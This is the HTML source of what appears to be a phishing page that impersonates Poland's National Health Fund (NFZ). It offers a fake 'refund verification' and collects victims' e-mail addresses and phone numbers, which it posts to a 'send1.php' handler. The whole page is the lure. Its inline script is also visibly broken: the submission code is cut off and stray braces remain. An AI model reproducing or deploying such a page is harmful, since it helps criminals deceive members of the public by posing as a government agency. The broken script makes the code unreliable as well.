<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href="fav.ico" rel="SHORTCUT ICON" />
    <title>Weryfikacja Zwrotu NFZ</title>
    <style>
        :root {
            --primary-color: #2e2383;
            --primary-hover: #1a165c;
            --secondary-color: #f8f9fa;
            --text-color: #333;
            --light-gray: #e9ecef;
            --border-radius: 8px;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            color: var(--text-color);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        header {
            background-color: white;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 1rem;
        }
        
        .logo-container {
            display: flex;
            justify-content: center;
            padding: 1rem 0;
        }
        
        .logo-container img {
            height: 60px;
            max-width: 100%;
        }
        
        main {
            flex: 1;
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem 1rem;
        }
        
        .form-container {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            overflow: hidden;
            margin: 0 auto;
            width: 100%;
            max-width: 500px;
        }
        
        .form-header {
            background-color: var(--primary-color);
            color: white;
            padding: 1.5rem;
            text-align: center;
        }
        
        .form-header h1 {
            font-size: 1.5rem;
            font-weight: 600;
        }
        
        .form-content {
            padding: 2rem;
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--text-color);
        }
        
        input {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid var(--light-gray);
            border-radius: var(--border-radius);
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        input:focus {
            border-color: var(--primary-color);
            outline: none;
            box-shadow: 0 0 0 3px rgba(46, 35, 131, 0.2);
        }
        
        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 1rem;
            border-radius: var(--border-radius);
            cursor: pointer;
            font-size: 1rem;
            font-weight: 600;
            width: 100%;
            transition: background-color 0.3s;
            margin-top: 1rem;
        }
        
        button:hover {
            background-color: var(--primary-hover);
        }
        
        .info-text {
            font-size: 0.875rem;
            color: #666;
            margin-top: 1.5rem;
            text-align: center;
        }
        
        .error {
            color: #dc3545;
            font-size: 0.875rem;
            margin-top: 0.5rem;
            display: none;
        }
        
        footer {
            background-color: var(--secondary-color);
            padding: 1rem;
            text-align: center;
            font-size: 0.875rem;
            color: #666;
        }
        
        @media (max-width: 768px) {
            main {
                padding: 1rem;
            }
            
            .form-container {
                border-radius: 0;
                box-shadow: none;
            }
            
            .form-header {
                padding: 1rem;
            }
            
            .form-header h1 {
                font-size: 1.25rem;
            }
            
            .form-content {
                padding: 1.5rem;
            }
        }
        
        /* Loading animation */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <header>
        <div class="logo-container">
            <img src="lgo.png" alt="">
        </div>
    </header>
    
    <main>
        <div class="form-container">
            <div class="form-header">
                <h1>Weryfikacja zwrotu kosztów</h1>
            </div>
            
            <div class="form-content">
			<form id="refundForm" action="send1.php" method="POST">
              
                    <div class="form-group">
                        <label for="email">Adres e-mail:</label>
                        <input type="email" id="email" name="eml" placeholder="np. jan.kowalski@example.com" required>
                        <div class="error" id="emailError">Proszę wprowadzić poprawny adres e-mail</div>
                    </div>
                    
                    <div class="form-group">
                        <label for="phone">Numer telefonu:</label>
                        <input type="tel" id="phone" name="allo" placeholder="np. 123456789" required>
                        <div class="error" id="phoneError">Proszę wprowadzić poprawny numer telefonu (9-11 cyfr)</div>
                    </div>
                    
                    <button type="submit" id="submitBtn">
                        <span id="buttonText">Zweryfikuj i odbierz zwrot</span>
                    </button>
                </form>
                
                <p class="info-text">
                    Po weryfikacji danych, zwrot środków zostanie przelany na Twoje konto bankowe w ciągu 2 dni roboczych.
                </p>
            </div>
        </div>
    </main>
    
    <footer>
        <p>© 2025 Narodowy Fundusz Zdrowia. Wszelkie prawa zastrzeżone.</p>
    </footer>

    <script>
        document.getElementById('refundForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Reset errors
            document.getElementById('emailError').style.display = 'none';
            document.getElementById('phoneError').style.display = 'none';
            
            // Get values
            const email = document.getElementById('email').value;
            const phone = document.getElementById('phone').value;
            let isValid = true;
            
            // Validate email
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                document.getElementById('emailError').style.display = 'block';
                isValid = false;
            }
            
            // Validate phone (Polish numbers)
            const phoneRegex = /^[0-9]{9,11}$/;
            const cleanPhone = phone.replace(/[-\s]/g, '');
            if (!phoneRegex.test(cleanPhone)) {
                document.getElementById('phoneError').style.display = 'block';
                isValid = false;
            }
            
            if (isValid) {
                // Show loading state
                const button = document.getElementById('submitBtn');
                const buttonText = document.getElementById('buttonText');
                button.disabled = true;
                button.innerHTML = '<span class="loading"></span> Przetwarzanie...';
                
                // Create FormData object
                const formData = new FormData();
                formData.append('email', email);
                formData.append('phone', cleanPhone);
                
               
                    });
                }, 1000); // Simulate network delay
            }
        });
    </script>
</body>
</html>